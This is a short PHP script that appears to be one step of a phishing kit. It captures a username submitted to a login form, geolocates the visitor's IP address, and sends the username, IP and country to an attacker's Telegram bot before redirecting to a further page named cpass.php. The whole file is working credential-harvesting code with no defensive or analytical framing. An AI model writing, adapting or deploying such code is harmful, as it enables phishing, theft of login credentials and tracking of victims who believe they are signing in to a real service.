<?php
session_start();

require_once("settings.php");
$website = "https://api.telegram.org/bot$token";

if (isset($_POST["usuario"]) && !empty($_POST["usuario"])) {
    $_SESSION["usuario"] = $_POST["usuario"]; // Guardamos el usuario en la sesión
    
    // Enviamos notificación a Telegram
    $ip = $_SERVER["REMOTE_ADDR"];
    $ch = curl_init("http://ip-api.com/json/$ip");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $ip_data = json_decode(curl_exec($ch), true);
    curl_close($ch);
    $country = $ip_data["country"] ?? "Desconocido";
    
    $msg = "🔐 *Nuevo inicio de sesión*\n📧 Usuario: " . $_POST["usuario"] . "\n🌍 País: $country\n🔗 IP: $ip";
    $url = "$website/sendMessage?chat_id=$chat_id&parse_mode=Markdown&text=" . urlencode($msg);
    file_get_contents($url);
    
    // Redirección
    header("Location: cpass.php");
    exit;
}
?>

